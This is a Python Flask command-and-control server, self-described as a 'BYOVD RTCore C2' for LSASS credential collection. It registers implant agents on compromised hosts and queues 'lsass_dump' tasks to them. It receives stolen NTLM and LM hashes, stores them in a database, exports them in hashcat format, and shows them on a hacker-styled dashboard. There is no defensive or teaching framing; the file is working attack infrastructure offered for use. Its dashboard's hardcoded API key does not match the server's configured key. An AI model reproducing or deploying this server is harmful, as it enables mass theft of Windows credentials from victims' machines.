#!/usr/bin/env python3
"""
BYOVD RTCore C2 Server - FIXED FLASK VERSION
Simple Flask-based C2 server for LSASS credential collection
"""

import sqlite3
import json
import logging
import time
import os
from datetime import datetime

from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS

# Configuration
CONFIG = {
    'host': '0.0.0.0',
    'port': 8080,
    'api_key': 'swiper-the-stealer-2025',
    'db_path': './c2_database.db',
    'credentials_path': './harvested_credentials',
}

app = Flask(__name__)
CORS(app)

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)

# Global storage
agents = {}
pending_commands = {}

def init_database():
    """Initialize SQLite database"""
    conn = sqlite3.connect(CONFIG['db_path'])
    cursor = conn.cursor()

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS agents (
            id TEXT PRIMARY KEY,
            data TEXT,
            last_seen REAL,
            status TEXT DEFAULT 'active'
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id TEXT,
            username TEXT,
            domain TEXT,
            ntlm TEXT,
            lm TEXT,
            timestamp TEXT
        )
    ''')

    conn.commit()
    conn.close()
    logger.info("Database initialized")

def authenticate_request(request):
    """Check API key authentication"""
    api_key = request.headers.get('X-API-Key')
    return api_key == CONFIG['api_key']

@app.route('/api/agent', methods=['POST'])
def handle_agent():
    """Main agent communication endpoint"""
    if not authenticate_request(request):
        return jsonify({'error': 'Unauthorized'}), 401

    try:
        data = request.get_json()
        agent_id = data.get('agent_id')
        command = data.get('command')

        if not agent_id or not command:
            return jsonify({'error': 'Missing agent_id or command'}), 400

        logger.info(f"Agent {agent_id}: {command}")

        if command == 'register':
            # Register new agent
            agents[agent_id] = {
                'data': data.get('data', {}),
                'last_seen': time.time(),
                'status': 'active'
            }

            # Store in database
            conn = sqlite3.connect(CONFIG['db_path'])
            cursor = conn.cursor()
            cursor.execute(
                'INSERT OR REPLACE INTO agents (id, data, last_seen, status) VALUES (?, ?, ?, ?)',
                (agent_id, json.dumps(data.get('data', {})), time.time(), 'active')
            )
            conn.commit()
            conn.close()

            logger.info(f"Agent {agent_id} registered")
            return jsonify({'status': 'success', 'message': 'Agent registered'})

        elif command == 'checkin':
            # Agent checking in for commands
            if agent_id in agents:
                agents[agent_id]['last_seen'] = time.time()

            # Check for pending commands
            response = {'status': 'success'}
            if agent_id in pending_commands and pending_commands[agent_id]:
                response['data'] = pending_commands[agent_id].pop(0)

            return jsonify(response)

        elif command == 'heartbeat':
            # Agent heartbeat
            if agent_id in agents:
                agents[agent_id]['last_seen'] = time.time()
            return jsonify({'status': 'success'})

        elif command == 'response':
            # Command response from agent
            response_data = data.get('data', {})

            if response_data.get('command') == 'lsass_dump' and response_data.get('success'):
                # Process LSASS credentials
                credentials = response_data.get('data', [])
                save_credentials(agent_id, credentials)
                logger.info(f"Received {len(credentials)} credentials from {agent_id}")

            return jsonify({'status': 'success'})

        else:
            return jsonify({'error': 'Unknown command'}), 400

    except Exception as e:
        logger.error(f"Error handling agent request: {e}")
        return jsonify({'error': 'Internal server error'}), 500

def save_credentials(agent_id, credentials):
    """Save credentials to database and files"""
    os.makedirs(CONFIG['credentials_path'], exist_ok=True)

    # Save to database
    conn = sqlite3.connect(CONFIG['db_path'])
    cursor = conn.cursor()

    for cred in credentials:
        cursor.execute('''
            INSERT INTO credentials (agent_id, username, domain, ntlm, lm, timestamp)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (
            agent_id,
            cred.get('username', ''),
            cred.get('domain', ''),
            cred.get('ntlm', ''),
            cred.get('lm', ''),
            datetime.now().isoformat()
        ))

    conn.commit()
    conn.close()

    # Save to JSON file
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    json_file = f"{CONFIG['credentials_path']}/lsass_dump_{agent_id}_{timestamp}.json"

    with open(json_file, 'w') as f:
        json.dump({
            'agent_id': agent_id,
            'timestamp': timestamp,
            'credentials': credentials
        }, f, indent=2)

    # Save hashcat format
    hashcat_file = f"{CONFIG['credentials_path']}/hashcat_{agent_id}_{timestamp}.txt"
    with open(hashcat_file, 'w') as f:
        for cred in credentials:
            if cred.get('ntlm'):
                f.write(f"{cred.get('domain', '')}\\{cred.get('username', '')}:{cred.get('ntlm')}\n")

@app.route('/api/agents', methods=['GET'])
def get_agents():
    """Get list of active agents"""
    active_agents = []
    current_time = time.time()

    for agent_id, agent_data in agents.items():
        if current_time - agent_data['last_seen'] < 300:  # 5 minutes timeout
            active_agents.append({
                'id': agent_id,
                'last_seen': agent_data['last_seen'],
                'status': agent_data['status']
            })

    return jsonify(active_agents)

@app.route('/api/credentials', methods=['GET'])
def get_credentials():
    """Get stored credentials"""
    conn = sqlite3.connect(CONFIG['db_path'])
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM credentials ORDER BY timestamp DESC LIMIT 50')

    results = cursor.fetchall()
    conn.close()

    credentials = []
    for row in results:
        credentials.append({
            'id': row[0],
            'agent_id': row[1],
            'username': row[2],
            'domain': row[3],
            'ntlm': row[4],
            'lm': row[5],
            'timestamp': row[6]
        })

    return jsonify(credentials)

@app.route('/api/command', methods=['POST'])
def send_command():
    """Send command to agent"""
    if not authenticate_request(request):
        return jsonify({'error': 'Unauthorized'}), 401

    data = request.get_json()
    agent_id = data.get('agent_id')
    command = data.get('command', 'lsass_dump')

    if not agent_id:
        return jsonify({'error': 'Missing agent_id'}), 400

    if agent_id not in pending_commands:
        pending_commands[agent_id] = []

    task_id = f"task_{int(time.time())}"
    command_data = {
        'command': command,
        'task_id': task_id,
        'parameters': data.get('parameters', {})
    }

    pending_commands[agent_id].append(command_data)
    logger.info(f"Command queued for {agent_id}: {command}")

    return jsonify({'status': 'success', 'task_id': task_id})

@app.route('/')
def dashboard():
    """Web dashboard"""
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>BYOVD C2 Dashboard</title>
        <style>
            body { font-family: monospace; background: #0a0a0a; color: #00ff41; padding: 20px; }
            .header { color: #ff6b6b; font-size: 24px; margin-bottom: 20px; }
            .section { border: 1px solid #00ff41; margin: 10px 0; padding: 15px; }
            .agent { background: #1a1a1a; padding: 10px; margin: 5px 0; border-left: 3px solid #00ff41; }
            .credential { background: #0d1421; padding: 10px; margin: 5px 0; border-left: 3px solid #4169e1; }
            .button { background: #ff6b6b; color: white; border: none; padding: 10px; cursor: pointer; margin: 5px; }
            .button:hover { background: #ff5252; }
        </style>
    </head>
    <body>
        <div class="header">BYOVD RTCore C2 Dashboard</div>

        <div class="section">
            <h3>Active Agents</h3>
            <div id="agents">Loading...</div>
            <button class="button" onclick="sendLsassDump()">Dump LSASS</button>
        </div>

        <div class="section">
            <h3>Harvested Credentials</h3>
            <div id="credentials">Loading...</div>
        </div>

        <script>
            let selectedAgent = null;

            function loadData() {
                fetch('/api/agents')
                    .then(r => r.json())
                    .then(agents => {
                        document.getElementById('agents').innerHTML = agents.map(agent =>
                            `<div class="agent" onclick="selectAgent('${agent.id}')">
                                <strong>Agent:</strong> ${agent.id}<br>
                                <strong>Last Seen:</strong> ${new Date(agent.last_seen * 1000).toLocaleString()}<br>
                                <strong>Status:</strong> ${agent.status}
                            </div>`
                        ).join('');
                    });

                fetch('/api/credentials')
                    .then(r => r.json())
                    .then(creds => {
                        document.getElementById('credentials').innerHTML = creds.map(cred =>
                            `<div class="credential">
                                <strong>${cred.domain}\\${cred.username}</strong><br>
                                <strong>NTLM:</strong> ${cred.ntlm || 'N/A'}<br>
                                <strong>Agent:</strong> ${cred.agent_id} | <strong>Time:</strong> ${cred.timestamp}
                            </div>`
                        ).join('');
                    });
            }

            function selectAgent(agentId) {
                selectedAgent = agentId;
                document.querySelectorAll('.agent').forEach(el => el.style.background = '#1a1a1a');
                event.target.style.background = '#2d4a2d';
            }

            function sendLsassDump() {
                if (!selectedAgent) {
                    alert('Select an agent first');
                    return;
                }

                fetch('/api/command', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-API-Key': 'rtcore-byovd-2024'
                    },
                    body: JSON.stringify({
                        agent_id: selectedAgent,
                        command: 'lsass_dump'
                    })
                })
                .then(r => r.json())
                .then(result => {
                    alert('LSASS dump command sent to ' + selectedAgent);
                });
            }

            loadData();
            setInterval(loadData, 5000);  // Refresh every 5 seconds
        </script>
    </body>
    </html>
    '''
    return html

if __name__ == '__main__':
    print("=" * 60)
    print("BYOVD RTCore C2 Server Starting")
    print("=" * 60)
    print(f"Server URL: http://{CONFIG['host']}:{CONFIG['port']}")
    print(f"API Key: {CONFIG['api_key']}")
    print(f"Dashboard: http://localhost:{CONFIG['port']}")
    print("=" * 60)

    # Initialize database
    init_database()
    os.makedirs(CONFIG['credentials_path'], exist_ok=True)

    # Start server
    app.run(host=CONFIG['host'], port=CONFIG['port'], debug=False)
